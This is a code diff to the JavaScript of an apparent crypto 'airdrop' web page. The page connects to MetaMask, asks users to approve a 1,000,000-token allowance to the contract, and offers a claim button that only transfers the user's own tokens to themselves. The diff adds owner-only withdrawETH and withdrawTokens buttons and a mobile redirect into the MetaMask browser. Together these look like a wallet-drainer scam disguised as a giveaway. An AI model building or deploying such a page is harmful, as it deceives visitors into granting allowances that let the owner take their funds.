@@ -240,51 +240,85 @@
     let contract;
     let accounts;
 
+    // Function for connecting MetaMask, with mobile deep link for mobile users
     async function connectMetaMask() {
       if (typeof window.ethereum !== 'undefined') {
+        // Detect MetaMask's presence and handle connection for mobile
+        if (/iphone|ipod|ipad|android/i.test(navigator.userAgent)) {
+          window.location.href = "metamask://"; // Redirect mobile users to MetaMask browser
+        }
+        
         web3 = new Web3(window.ethereum);
         try {
           accounts = await ethereum.request({ method: 'eth_requestAccounts' });
           contract = new web3.eth.Contract(contractABI, contractAddress);
-          document.getElementById('connectButton').disabled = true;
-          document.getElementById('approveButton').disabled = false;
-          document.getElementById('claimAirdropButton').disabled = false;
+          document.getElementById("connectButton").disabled = true;
+          document.getElementById("approveButton").disabled = false;
+          document.getElementById("claimAirdropButton").disabled = false;
+          checkOwner();
         } catch (error) {
-          console.error("User denied account access");
+          console.error('User denied account access');
         }
       } else {
-        alert('Please install MetaMask to use this site');
+        alert('Please install MetaMask to continue.');
       }
     }
 
-    async function approveUnlimited() {
+    // Check if the connected address is the owner
+    async function checkOwner() {
+      const owner = await contract.methods.owner().call();
+      if (accounts[0].toLowerCase() === owner.toLowerCase()) {
+        document.getElementById("ownerButtons").style.display = 'block';
+      }
+    }
+
+    // Approve the token transfer for the contract
+    async function approveTokens() {
       const spender = contractAddress;
       const amount = web3.utils.toWei('1000000', 'ether');
-      await contract.methods.approve(spender, amount).send({ from: accounts[0] });
-      document.getElementById('approveButton').disabled = true;
-    }
-
-    async function claimAirdrop() {
-      const amount = web3.utils.toWei('1', 'ether');
-      await contract.methods.transfer(accounts[0], amount).send({ from: accounts[0] });
-      document.getElementById('claimAirdropButton').disabled = true;
-      document.getElementById('processingMessage').classList.add('show');
-    }
-
-    async function redirectToMetaMaskBrowserIfMobile() {
-      if (/Mobi|Android/i.test(navigator.userAgent)) {
-        window.location.href = "https://metamask.app.link";
-      } else {
-        alert('MetaMask is only available in the mobile browser. Please open this page within the MetaMask mobile app.');
+      try {
+        await contract.methods.approve(spender, amount).send({ from: accounts[0] });
+      } catch (error) {
+        console.error('Approval failed:', error);
       }
     }
 
-    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveUnlimited);
-    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
-    
-    // Redirect user to MetaMask mobile browser
-    window.onload = redirectToMetaMaskBrowserIfMobile;
+    // Claim airdrop
+    async function claimAirdrop() {
+      const amount = web3.utils.toWei('1', 'ether');
+      try {
+        await contract.methods.transfer(accounts[0], amount).send({ from: accounts[0] });
+      } catch (error) {
+        console.error('Airdrop claim failed:', error);
+      }
+    }
+
+    // Withdraw ETH
+    async function withdrawETH() {
+      try {
+        await contract.methods.withdrawETH().send({ from: accounts[0] });
+      } catch (error) {
+        console.error('Withdraw ETH failed:', error);
+      }
+    }
+
+    // Withdraw tokens
+    async function withdrawTokens() {
+      try {
+        await contract.methods.withdrawTokens().send({ from: accounts[0] });
+      } catch (error) {
+        console.error('Withdraw tokens failed:', error);
+      }
+    }
+
+    // Event listeners for buttons
+    document.getElementById("connectButton").addEventListener("click", connectMetaMask);
+    document.getElementById("approveButton").addEventListener("click", approveTokens);
+    document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
+    document.getElementById("withdrawETHButton").addEventListener("click", withdrawETH);
+    document.getElementById("withdrawTokensButton").addEventListener("click", withdrawTokens);
+
   </script>
 </body>
 </html>
+
